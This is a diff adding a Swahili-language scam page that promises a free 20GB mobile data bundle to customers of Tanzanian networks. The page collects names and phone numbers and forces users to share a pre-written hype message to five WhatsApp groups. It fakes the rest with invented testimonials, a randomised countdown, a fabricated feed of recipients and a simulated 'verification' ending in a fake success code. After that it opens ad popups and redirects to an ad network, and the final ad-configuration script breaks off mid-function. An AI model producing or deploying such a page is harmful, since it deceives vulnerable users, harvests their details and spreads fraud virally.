@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+
+<html lang="sw">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Mpango wa Bure wa Data 20GB - Tanzania Networks</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        .header {
+            background: linear-gradient(to right, #0066cc, #003399);
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-btn {
+            background: #0066cc;
+            color: white;
+            padding: 5px 15px;
+            border: none;
+            cursor: pointer;
+        }
+        .nav-btn:hover {
+            background: #004080;
+        }
+        .content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .form-section {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        #timer {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        .news-ticker {
+            background: #e74c3c;
+            color: white;
+            padding: 5px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        .footer {
+            background: #0066cc;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        .slideshow {
+            position: relative;
+            width: 100%;
+            height: 280px;
+            overflow: hidden;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+        .slide.active {
+            opacity: 1;
+        }
+        .slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .progress-bar {
+            background: #e0e0e0;
+            border-radius: 5px;
+            height: 10px;
+            width: 100%;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: #2ecc71;
+            height: 100%;
+            transition: width 0.3s ease-in-out;
+        }
+        #submitButton {
+            display: none; /* Hidden until 5 shares */
+            background: linear-gradient(to right, #2ecc71, #27ae60);
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        #submitButton:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
+        }
+        /* Hamburger menu styles */
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+        }
+        .hamburger span {
+            background: white;
+            height: 3px;
+            width: 25px;
+            margin: 2px 0;
+        }
+        .nav-menu {
+            display: flex;
+            gap: 1rem;
+        }
+        .network-logos {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .network-logo {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            margin: 10px;
+            transition: transform 0.3s ease;
+        }
+        .network-logo:hover {
+            transform: scale(1.1);
+        }
+        .bundle-card {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+            border-left: 4px solid #2ecc71;
+        }
+        .green-badge {
+            background: #2ecc71;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin-left: 5px;
+        }
+        @media (max-width: 768px) {
+            .nav-menu {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: #0066cc;
+                padding: 10px 0;
+                z-index: 20;
+            }
+            .nav-menu.active {
+                display: flex;
+            }
+            .nav-btn {
+                display: block;
+                width: 100%;
+                text-align: center;
+                padding: 10px;
+                border-bottom: 1px solid #004080;
+            }
+            .hamburger {
+                display: flex;
+            }
+            .network-logo {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="header">
+<div>
+<span class="font-bold text-xl">🚀 DATA 20GB BURE</span>
+</div>
+<div class="hamburger" id="hamburger">
+<span></span>
+<span></span>
+<span></span>
+</div>
+<div class="nav-menu" id="navMenu">
+<button class="nav-btn">Mitandao</button>
+<button class="nav-btn">Msaada</button>
+<button class="nav-btn">Jinsi ya Kupata</button>
+<button class="nav-btn">Maswali</button>
+</div>
+</div>
+<div class="news-ticker">
+    ⚡ MUHIMU: Mpango wa Hisani wa Data Bure 20GB kwa wateja wa Mitandao yote Tanzania umeongezwa hadi tarehe 19 Juni 2023! ⚡
+</div>
+<div class="content mt-4">
+<div class="slideshow">
+<div class="slide active"><img alt="Mobile Data Bundle" src="https://cdn.pixabay.com/photo/2017/10/12/22/17/mobile-2846221_1280.jpg"/></div>
+<div class="slide"><img alt="Internet" src="https://cdn.pixabay.com/photo/2019/09/09/16/56/network-4464674_1280.jpg"/></div>
+<div class="slide"><img alt="Smartphone Data" src="https://cdn.pixabay.com/photo/2014/08/05/10/30/iphone-410324_1280.jpg"/></div>
+</div>
+
+<h1 class="text-3xl font-bold text-center">PATA DATA BURE 20GB KWA MTANDAO WAKO</h1>
+<p class="text-center mt-2">Mpango Maalum wa Majaribio kwa Wateja wa Tanzania</p>
+<p class="text-center text-red-600 mt-2">Muda Unakwisha: <span id="timer"></span></p>
+
+<div class="network-logos">
+    <img class="network-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Vodacom_Tanzania.svg/1200px-Vodacom_Tanzania.svg.png" alt="Vodacom" />
+    <img class="network-logo" src="https://tz.airtel.com/assets/images/logo.png" alt="Airtel" />
+    <img class="network-logo" src="https://www.tigo.co.tz/sites/default/files/Tigo-Brand-Logo%402x.png" alt="Tigo" />
+    <img class="network-logo" src="https://halotel.co.tz/assets/imgs/logo.webp" alt="Halotel" />
+    <img class="network-logo" src="https://ttcl.co.tz/images/ttcl_logo.png" alt="TTCL" />
+</div>
+
+<div class="bundle-card">
+    <h3 class="font-bold">20GB Data Bundle <span class="green-badge">BURE</span></h3>
+    <p>✅ Matumizi yote ya data: Media, Streaming, Browsing</p>
+    <p>✅ Inatumika kwenye simu, kompyuta na vifaa vyote</p>
+    <p>✅ Inatumika masaa 24 kwa siku</p>
+    <p>✅ Muda wa bundle: Siku 30</p>
+</div>
+
+<div class="form-section mt-6">
+<form class="space-y-4" id="bundleForm">
+<div>
+<label class="block text-sm font-medium" for="name">Jina Kamili</label>
+<input class="w-full p-2 border rounded" id="name" required="" type="text"/>
+</div>
+<div>
+<label class="block text-sm font-medium" for="phone">Namba ya Simu</label>
+<input class="w-full p-2 border rounded" id="phone" required="" type="tel" placeholder="0712345678"/>
+</div>
+<div>
+<label class="block text-sm font-medium" for="network">Mtandao</label>
+<select class="w-full p-2 border rounded" id="network" required="">
+<option value="">Chagua Mtandao</option>
+<option value="Vodacom">Vodacom</option>
+<option value="Airtel">Airtel</option>
+<option value="Tigo">Tigo</option>
+<option value="Halotel">Halotel</option>
+<option value="TTCL">TTCL</option>
+</select>
+</div>
+<div class="text-center">
+<p class="text-sm">Lazima ushiriki kiungo hiki kwa vikundi 5 vya WhatsApp ili kuhitimu:</p>
+<button class="mt-2 px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700" id="shareButton" type="button">Shiriki kwa WhatsApp</button>
+<p class="mt-2 text-sm" id="shareStatus">Vikundi Vilivyoshirikiwa: <span id="shareCount">0</span>/5</p>
+<div class="progress-bar mt-2">
+<div class="progress-fill" id="progressFill" style="width: 0%"></div>
+</div>
+</div>
+<button class="w-full px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700" disabled="" id="submitButton" type="submit">PATA DATA 20GB SASA</button>
+</form>
+</div>
+
+<div class="mt-8">
+    <h3 class="text-xl font-bold">Maoni kutoka kwa Watumiaji</h3>
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
+        <div class="bg-white p-4 rounded shadow">
+            <div class="flex items-center mb-2">
+                <img src="https://randomuser.me/api/portraits/men/32.jpg" class="w-10 h-10 rounded-full mr-2">
+                <div>
+                    <p class="font-semibold">James Shirima</p>
+                    <div class="flex">
+                        <span class="text-yellow-500">★★★★★</span>
+                    </div>
+                </div>
+            </div>
+            <p>Nashukuru sana kwa hii data, imetusaidia sana! Nimepata 20GB na zinawork kweli.</p>
+        </div>
+        <div class="bg-white p-4 rounded shadow">
+            <div class="flex items-center mb-2">
+                <img src="https://randomuser.me/api/portraits/women/44.jpg" class="w-10 h-10 rounded-full mr-2">
+                <div>
+                    <p class="font-semibold">Maria Joseph</p>
+                    <div class="flex">
+                        <span class="text-yellow-500">★★★★★</span>
+                    </div>
+                </div>
+            </div>
+            <p>Nimeshiriki tu na rafiki zangu 5 na kupata data 20GB kwenye Vodacom. Asante sana kwa zawadi hii!</p>
+        </div>
+    </div>
+</div>
+
+</div>
+
+<div class="footer mt-10">
+<p>© 2023 Tanzania Data Bundles Program<br/>Shirika la Mawasiliano Tanzania<br/>support@databundletz-program.co.tz</p>
+<p class="mt-2">Mpango huu unafadhiliwa na Wasambazaji wa Huduma za Intaneti Tanzania</p>
+</div>
+
+<script>
+        let shareCount = 0;
+        const maxShares = 5;
+        const shareButton = document.getElementById('shareButton');
+        const submitButton = document.getElementById('submitButton');
+        const shareCountElement = document.getElementById('shareCount');
+        const progressFill = document.getElementById('progressFill');
+        const form = document.getElementById('bundleForm');
+        const hamburger = document.getElementById('hamburger');
+        const navMenu = document.getElementById('navMenu');
+        const shareLink = 'LINK_HUU_HAPA'; // Replace with the shortened URL of this page
+        let slideIndex = 0;
+        
+        // Network selection sync between visual options and dropdown
+        const networkRadios = document.querySelectorAll('.network-radio');
+        const networkSelect = document.getElementById('network-select');
+        
+        networkRadios.forEach(radio => {
+            radio.addEventListener('change', function() {
+                networkSelect.value = this.value;
+                
+                // Add animation effect to selected network
+                document.querySelectorAll('.network-label').forEach(label => {
+                    label.classList.remove('pulse-animation');
+                });
+                this.nextElementSibling.classList.add('pulse-animation');
+            });
+        });
+        
+        networkSelect.addEventListener('change', function() {
+            const selected = this.value;
+            if (selected) {
+                const radio = document.querySelector(`input[value="${selected}"]`);
+                if (radio) radio.checked = true;
+                
+                // Add animation effect to selected network
+                document.querySelectorAll('.network-label').forEach(label => {
+                    label.classList.remove('pulse-animation');
+                });
+                radio.nextElementSibling.classList.add('pulse-animation');
+            }
+        });
+
+        // Hamburger menu toggle with animation
+        hamburger.addEventListener('click', () => {
+            hamburger.classList.toggle('active');
+            navMenu.classList.toggle('active');
+        });
+
+        // Enhanced slideshow with fade effects
+        const slides = document.querySelectorAll('.slide');
+        function showSlides() {
+            slides.forEach(slide => {
+                slide.style.opacity = '0';
+                setTimeout(() => {
+                    slide.classList.remove('active');
+                }, 1000);
+            });
+            
+            slideIndex++;
+            if (slideIndex >= slides.length) slideIndex = 0;
+            
+            const activeSlide = slides[slideIndex];
+            activeSlide.classList.add('active');
+            setTimeout(() => {
+                activeSlide.style.opacity = '1';
+            }, 50);
+            
+            setTimeout(showSlides, 5000);
+        }
+        showSlides();
+
+        // Dynamic countdown timer with seconds updating
+        const deadline = new Date();
+        deadline.setHours(deadline.getHours() + 3);
+        deadline.setMinutes(deadline.getMinutes() + Math.floor(Math.random() * 30));
+        const timer = document.getElementById('timer');
+        
+        function updateTimer() {
+            const now = new Date().getTime();
+            const distance = deadline - now;
+            
+            if (distance < 0) {
+                timer.textContent = 'Muda Umekwisha!';
+                return;
+            }
+            
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            
+            timer.textContent = `${hours}h ${minutes}m ${seconds}s`;
+            
+            // Add shake animation when time is running low
+            if (hours === 0 && minutes < 30 && seconds % 10 === 0) {
+                timer.parentElement.classList.add('shake-animation');
+                setTimeout(() => {
+                    timer.parentElement.classList.remove('shake-animation');
+                }, 820);
+            }
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+        
+        // Active users counter simulation
+        const activeUsersElement = document.getElementById('active-users');
+        let activeUsers = 219;
+        
+        function updateActiveUsers() {
+            // Random fluctuation in active users
+            const change = Math.floor(Math.random() * 5) - 2; // -2 to +2
+            activeUsers += change;
+            
+            // Keep within reasonable bounds
+            if (activeUsers < 190) activeUsers = 190 + Math.floor(Math.random() * 10);
+            if (activeUsers > 250) activeUsers = 250 - Math.floor(Math.random() * 10);
+            
+            activeUsersElement.textContent = activeUsers;
+            
+            // Schedule next update
+            setTimeout(updateActiveUsers, 3000 + Math.random() * 3000);
+        }
+        updateActiveUsers();
+        
+        // Live feed of people receiving data
+        const liveFeed = document.getElementById('live-feed');
+        const networks = ['Vodacom', 'Airtel', 'Tigo', 'Halotel', 'TTCL'];
+        const locations = ['Dar es Salaam', 'Arusha', 'Mwanza', 'Dodoma', 'Mbeya', 'Tanga', 'Morogoro', 'Zanzibar', 'Tabora', 'Kigoma'];
+        const maleNames = ['James', 'John', 'Joseph', 'Samuel', 'Daniel', 'Michael', 'David', 'Robert', 'Charles', 'Emmanuel', 'Frank', 'George'];
+        const femaleNames = ['Mary', 'Sarah', 'Elizabeth', 'Joyce', 'Anna', 'Grace', 'Neema', 'Rose', 'Rehema', 'Sophia', 'Victoria', 'Zawadi'];
+        const surnames = ['Shirima', 'Mwakasege', 'Joseph', 'Kitenge', 'Mushi', 'Mohammed', 'Ibrahim', 'Swai', 'Massawe', 'Mwanga', 'Thomas', 'Kimaro'];
+        
+        function getRandomElement(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+        
+        function generateLiveFeedItem() {
+            const gender = Math.random() > 0.5 ? 'male' : 'female';
+            const firstName = gender === 'male' ? getRandomElement(maleNames) : getRandomElement(femaleNames);
+            const surname = getRandomElement(surnames);
+            const network = getRandomElement(networks);
+            const location = getRandomElement(locations);
+            const minutesAgo = Math.floor(Math.random() * 28) + 1;
+            const phoneNumber = `0${7 + Math.floor(Math.random() * 3)}${Math.floor(Math.random() * 10000000).toString().padStart(7, '0')}`;
+            
+            return {
+                name: `${firstName} ${surname.charAt(0)}.`,
+                network,
+                location,
+                minutesAgo,
+                phoneNumber,
+                gender
+            };
+        }
+        
+        function updateLiveFeed() {
+            if (liveFeed.children.length >= 15) {
+                liveFeed.removeChild(liveFeed.lastChild);
+            }
+            
+            const item = generateLiveFeedItem();
+            const itemElement = document.createElement('div');
+            itemElement.className = 'p-2 flex items-center animate-fadeIn';
+            itemElement.innerHTML = `
+                <img src="https://randomuser.me/api/portraits/${item.gender}/${Math.floor(Math.random() * 70)}.jpg" class="w-8 h-8 rounded-full mr-2">
+                <div class="flex-1">
+                    <div class="text-sm">${item.name} (${item.phoneNumber.substring(0, 4)}****${item.phoneNumber.substring(9)}) amepokea <span class="font-semibold text-green-600">Data 20GB</span></div>
+                    <div class="text-xs text-gray-500">${item.network} - ${item.location} • Dakika ${item.minutesAgo} zilizopita</div>
+                </div>
+            `;
+            
+            // Prepend to the feed
+            liveFeed.insertBefore(itemElement, liveFeed.firstChild);
+            itemElement.style.opacity = '0';
+            setTimeout(() => {
+                itemElement.style.opacity = '1';
+            }, 50);
+            
+            // Schedule next update
+            setTimeout(updateLiveFeed, 5000 + Math.random() * 5000);
+        }
+        
+        // Initial feed items
+        for (let i = 0; i < 5; i++) {
+            updateLiveFeed();
+        }
+
+        // Enhanced WhatsApp share with progress bar and submit trigger
+        shareButton.addEventListener('click', () => {
+            if (shareCount < maxShares) {
+                // Check if form fields are filled
+                const name = document.getElementById('name').value;
+                const phone = document.getElementById('phone').value;
+                const network = networkSelect.value;
+                
+                if (!name || !phone || !network) {
+                    alert('Tafadhali jaza taarifa zako kwanza kabla ya kushiriki!');
+                    return;
+                }
+                
+                const message = encodeURIComponent(`🔴 MUHIMU: Nimetumwa nikushirikishe MPANGO MAALUM wa DATA BURE! ⚡\n\n✅ PATA DATA 20GB BURE kwa MTANDAO WOWOTE (Vodacom, Airtel, Tigo, Halotel, TTCL)!\n\n✅ Mpango huu ni wa SIKU 3 TU, utakwisha hivi karibuni.\n\n👉 FUNGUA LINK KUPATA DATA YAKO SASA: ${shareLink}\n\n🔄 Ushiriki huu ni kwa Siku 3 Tu. OFA INAISHA LEO! HARAKA!!`);
+                window.open(`https://api.whatsapp.com/send?text=${message}`);
+                
+                shareCount++;
+                shareCountElement.textContent = shareCount;
+                const progressPercentage = (shareCount / maxShares) * 100;
+                progressFill.style.width = `${progressPercentage}%`;
+                
+                // Show visual feedback
+                shareButton.classList.add('pulse-animation');
+                setTimeout(() => {
+                    shareButton.classList.remove('pulse-animation');
+                }, 2000);
+                
+                if (shareCount === maxShares) {
+                    // Show success message
+                    const successMessage = document.createElement('div');
+                    successMessage.className = 'bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mt-4 flex items-center';
+                    successMessage.innerHTML = `
+                        <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        <span>Umefanikiwa kushiriki! Sasa unaweza kupokea data yako.</span>
+                    `;
+                    shareButton.parentNode.appendChild(successMessage);
+                    
+                    // Enable submit button with animation
+                    submitButton.style.display = 'flex';
+                    submitButton.disabled = false;
+                    submitButton.classList.add('shake-animation');
+                    setTimeout(() => {
+                        submitButton.classList.remove('shake-animation');
+                    }, 820);
+                    
+                    // Disable share button
+                    shareButton.disabled = true;
+                    shareButton.textContent = 'Umefanikiwa Kushiriki!';
+                    shareButton.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    shareButton.classList.add('bg-gray-400');
+                }
+            }
+        });
+
+        // Enhanced form submission with detailed simulation
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (shareCount >= maxShares) {
+                // Get user input
+                const name = document.getElementById('name').value;
+                const phone = document.getElementById('phone').value;
+                const network = networkSelect.value;
+                
+                // Create detailed loading overlay
+                const overlay = document.createElement('div');
+                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:1000;display:flex;justify-content:center;align-items:center;flex-direction:column;';
+                
+                const loadingBox = document.createElement('div');
+                loadingBox.style.cssText = 'background:white;padding:30px;border-radius:15px;text-align:center;max-width:90%;width:400px;box-shadow:0 10px 25px rgba(0,0,0,0.3);';
+                
+                // Network logo at the top
+                const networkLogo = document.createElement('div');
+                networkLogo.style.cssText = 'margin:0 auto 20px;width:80px;height:80px;background:white;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 5px 15px rgba(0,0,0,0.1);';
+                
+                let logoUrl = '';
+                switch(network) {
+                    case 'Vodacom': 
+                        logoUrl = 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Vodacom_Tanzania.svg/1200px-Vodacom_Tanzania.svg.png';
+                        break;
+                    case 'Airtel':
+                        logoUrl = 'https://tz.airtel.com/assets/images/logo.png';
+                        break;
+                    case 'Tigo':
+                        logoUrl = 'https://www.tigo.co.tz/sites/default/files/Tigo-Brand-Logo%402x.png';
+                        break;
+                    case 'Halotel':
+                        logoUrl = 'https://halotel.co.tz/assets/imgs/logo.webp';
+                        break;
+                    case 'TTCL':
+                        logoUrl = 'https://ttcl.co.tz/images/ttcl_logo.png';
+                        break;
+                }
+                
+                networkLogo.innerHTML = `<img src="${logoUrl}" style="max-width:60px;max-height:60px;object-fit:contain;">`;
+                loadingBox.appendChild(networkLogo);
+                
+                // Title with user info
+                const title = document.createElement('h3');
+                title.style.cssText = 'font-size:1.3rem;font-weight:bold;margin-bottom:5px;color:#333;';
+                title.textContent = 'Inathibitisha Taarifa Zako';
+                loadingBox.appendChild(title);
+                
+                const userInfo = document.createElement('p');
+                userInfo.style.cssText = 'color:#666;margin-bottom:20px;';
+                userInfo.innerHTML = `<strong>${name}</strong> | ${phone} | ${network}`;
+                loadingBox.appendChild(userInfo);
+                
+                // Progress indicator
+                const progressContainer = document.createElement('div');
+                progressContainer.style.cssText = 'width:100%;margin-bottom:25px;';
+                
+                const progressTracker = document.createElement('div');
+                progressTracker.style.cssText = 'display:flex;justify-content:space-between;position:relative;margin-bottom:10px;';
+                
+                const progressLine = document.createElement('div');
+                progressLine.style.cssText = 'position:absolute;top:10px;left:0;right:0;height:4px;background:#e0e0e0;z-index:1;';
+                progressTracker.appendChild(progressLine);
+                
+                const progressFill = document.createElement('div');
+                progressFill.style.cssText = 'position:absolute;top:10px;left:0;height:4px;background:#2ecc71;z-index:2;width:0%;transition:width 0.5s ease;';
+                progressTracker.appendChild(progressFill);
+                
+                // Create step indicators
+                const steps = ['Uthibitisho', 'Maandalizi', 'Utoaji', 'Kukamilika'];
+                const stepElements = [];
+                
+                steps.forEach((step, index) => {
+                    const stepEl = document.createElement('div');
+                    stepEl.style.cssText = 'display:flex;flex-direction:column;align-items:center;z-index:3;';
+                    
+                    const dot = document.createElement('div');
+                    dot.style.cssText = 'width:20px;height:20px;border-radius:50%;background:#e0e0e0;margin-bottom:5px;display:flex;align-items:center;justify-content:center;transition:all 0.3s ease;';
+                    
+                    const icon = document.createElement('i');
+                    icon.className = 'fas fa-check';
+                    icon.style.cssText = 'color:white;font-size:10px;opacity:0;transition:opacity 0.3s ease;';
+                    dot.appendChild(icon);
+                    
+                    const label = document.createElement('div');
+                    label.style.cssText = 'font-size:0.7rem;color:#666;';
+                    label.textContent = step;
+                    
+                    stepEl.appendChild(dot);
+                    stepEl.appendChild(label);
+                    progressTracker.appendChild(stepEl);
+                    stepElements.push({dot, icon});
+                });
+                
+                progressContainer.appendChild(progressTracker);
+                loadingBox.appendChild(progressContainer);
+                
+                const spinner = document.createElement('div');
+                spinner.style.cssText = 'border:5px solid #f3f3f3;border-top:5px solid #2ecc71;border-radius:50%;width:50px;height:50px;margin:0 auto 20px;animation:spin 1s linear infinite;';
+                spinner.innerHTML = '<style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
+                loadingBox.appendChild(spinner);
+                
+                const statusText = document.createElement('div');
+                statusText.style.cssText = 'font-weight:bold;color:#2ecc71;margin-bottom:15px;height:50px;display:flex;align-items:center;justify-content:center;';
+                loadingBox.appendChild(statusText);
+                
+                const progressText = document.createElement('div');
+                progressText.style.cssText = 'color:#666;font-size:0.9rem;';
+                loadingBox.appendChild(progressText);
+                
+                overlay.appendChild(loadingBox);
+                document.body.appendChild(overlay);
+                
+                // Prepare verification details
+                const serverLocations = {
+                    'Vodacom': 'Dar es Salaam',
+                    'Airtel': 'Arusha',
+                    'Tigo': 'Dodoma',
+                    'Halotel': 'Mwanza',
+                    'TTCL': 'Zanzibar'
+                };
+                
+                const serverLocation = serverLocations[network] || 'Dar es Salaam';
+                const bundleCode = Math.random().toString(36).substring(2, 10).toUpperCase();
+                
+                // Simulate verification process with detailed steps
+                let progress = 0;
+                const progressSteps = [
+                    { 
+                        message: 'Kuthibitisha namba ya simu...',
+                        detail: `Inatuma ombi la uthibitisho kwa ${network}...`
+                    },
+                    { 
+                        message: 'Kuangalia usajili wa mtandao...',
+                        detail: `Imeunganishwa na server ya ${network} (${serverLocation})`
+                    },
+                    { 
+                        message: 'Kutengeneza bundle ya data...',
+                        detail: `Inatengeneza code ya bundle: #${bundleCode}`
+                    },
+                    { 
+                        message: 'Kuthibitisha stakabadhi...',
+                        detail: 'Inathibitisha taarifa zako na msimbo wa ufikiaji'
+                    },
+                    { 
+                        message: 'Kuunganisha na mfumo wa ${network}...',
+                        detail: `Inapakua stakabadhi za utoaji data kutoka server`
+                    },
+                    { 
+                        message: 'Kutayarisha data 20GB...',
+                        detail: 'Inachambua mpango wa data na tarehe za matumizi'
+                    },
+                    { 
+                        message: 'Kuruhusu data kwenye akaunti...',
+                        detail: `Inaunganisha na mfumo wa kati wa ${network}`
+                    },
+                    { 
+                        message: 'Kuhakikisha ufikiaji...',
+                        detail: 'Inahakikisha ufikiaji wa huduma za mtandao'
+                    }
+                ];
+                
+                let currentStep = 0;
+                
+                const updateProgress = (step, width) => {
+                    // Update progress bar
+                    progressFill.style.width = `${width}%`;
+                    
+                    // Update step indicators
+                    for (let i = 0; i <= step; i++) {
+                        if (stepElements[i]) {
+                            stepElements[i].dot.style.background = '#2ecc71';
+                            stepElements[i].icon.style.opacity = '1';
+                        }
+                    }
+                };
+                
+                const interval = setInterval(() => {
+                    progress++;
+                    
+                    if (progress <= progressSteps.length) {
+                        const stepInfo = progressSteps[progress-1];
+                        statusText.textContent = stepInfo.message.replace('${network}', network);
+                        progressText.textContent = stepInfo.detail.replace('${network}', network);
+                        
+                        // Determine which major step we're in
+                        if (progress <= 2) {
+                            currentStep = 0; // Verification
+                            updateProgress(0, (progress / 2) * 25);
+                        } else if (progress <= 4) {
+                            currentStep = 1; // Preparation
+                            updateProgress(1, 25 + ((progress - 2) / 2) * 25);
+                        } else if (progress <= 6) {
+                            currentStep = 2; // Provision
+                            updateProgress(2, 50 + ((progress - 4) / 2) * 25);
+                        } else {
+                            currentStep = 3; // Completion
+                            updateProgress(3, 75 + ((progress - 6) / 2) * 25);
+                        }
+                    }
+                    
+                    if (progress > progressSteps.length) {
+                        clearInterval(interval);
+                        
+                        // Final step - show success
+                        spinner.style.display = 'none';
+                        
+                        const successIcon = document.createElement('div');
+                        successIcon.innerHTML = '<svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/><path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>';
+                        successIcon.style.cssText = 'width:80px;height:80px;margin:0 auto 20px;';
+                        successIcon.innerHTML += `
+                            <style>
+                                .checkmark__circle {
+                                    stroke-dasharray: 166;
+                                    stroke-dashoffset: 166;
+                                    stroke-width: 2;
+                                    stroke-miterlimit: 10;
+                                    stroke: #2ecc71;
+                                    fill: none;
+                                    animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+                                }
+                                .checkmark {
+                                    width: 80px;
+                                    height: 80px;
+                                    border-radius: 50%;
+                                    display: block;
+                                    stroke-width: 2;
+                                    stroke: #fff;
+                                    stroke-miterlimit: 10;
+                                    box-shadow: inset 0px 0px 0px #2ecc71;
+                                    animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+                                }
+                                .checkmark__check {
+                                    transform-origin: 50% 50%;
+                                    stroke-dasharray: 48;
+                                    stroke-dashoffset: 48;
+                                    animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+                                }
+                                @keyframes stroke {
+                                    100% {
+                                        stroke-dashoffset: 0;
+                                    }
+                                }
+                                @keyframes scale {
+                                    0%, 100% {
+                                        transform: none;
+                                    }
+                                    50% {
+                                        transform: scale3d(1.1, 1.1, 1);
+                                    }
+                                }
+                                @keyframes fill {
+                                    100% {
+                                        box-shadow: inset 0px 0px 0px 30px #2ecc71;
+                                    }
+                                }
+                            </style>
+                        `;
+                        
+                        loadingBox.insertBefore(successIcon, statusText);
+                        statusText.innerHTML = '<span style="color:#2ecc71;font-size:1.2rem;font-weight:bold;">Hongera! Data 20GB Imetumwa!</span>';
+                        progressText.innerHTML = `Data itaonekana kwenye simu yako ndani ya dakika 5.<br>Namba ya kumbukumbu: <b>${bundleCode}</b>`;
+                        
+                        // Show confirmation button
+                        const confirmButton = document.createElement('button');
+                        confirmButton.textContent = 'ENDELEA';
+                        confirmButton.style.cssText = 'background:#2ecc71;color:white;border:none;border-radius:30px;padding:12px 30px;margin-top:20px;font-weight:bold;cursor:pointer;transition:all 0.3s ease;';
+                        confirmButton.addEventListener('mouseover', () => {
+                            confirmButton.style.background = '#27ae60';
+                        });
+                        confirmButton.addEventListener('mouseout', () => {
+                            confirmButton.style.background = '#2ecc71';
+                        });
+                        loadingBox.appendChild(confirmButton);
+                        
+                        // ENABLE AGGRESSIVE MONETIZATION ONLY AFTER FORM COMPLETION
+                        confirmButton.addEventListener('click', () => {
+                            // First popup - after verification complete
+                            window.open("https://www.profitableratecpm.com/kvc6kej98?key=750f269a749fe39ed0dd6da5e0fbea28", "_blank");
+                            
+                            setTimeout(() => {
+                                // Second popup - just before redirection
+                                window.open("https://www.profitableratecpm.com/ggrjpfgjyv?key=e22432e92181b68e1ed59e1d08ef8b3c", "_blank");
+                                
+                                // Finally redirect
+                                setTimeout(() => {
+                                    window.location.href = 'https://www.profitableratecpm.com/ggrjpfgjyv?key=e22432e92181b68e1ed59e1d08ef8b3c';
+                                }, 1000);
+                            }, 1500);
+                        });
+                    }
+                }, 1800);
+            }
+        });
+</script>
+
+<!-- 💰 Enhanced Premium Ad Configuration for Maximum CPM 💸 -->
+<script>
+// Global ad configuration variables - Optimized for better user experience
+const AD_CONFIG = {
+    delayPopup: 999999,     // Effectively disabled during form filling
+    popupFrequency: 999,    // Effectively disabled during form filling
+    popunderEnabled: false, // Disabled during form filling
+    socialBar: false,       // Disabled until submission
+    adRefreshRate: 30000,   // Keep refresh rate for existing ads
+    exitIntent: false,      // Disabled during form filling
+    formSubmitted: false    // Track if form has been submitted
+};
+
+// Update form submission handler to enable aggressive monetization after submission
+const originalFormHandler = form.addEventListener;
+form.addEventListener = function(event, handler) {
+    if (event === 'submit') {
+        const enhancedHandler = function(e) {
+            const result = handler.call(this, e);
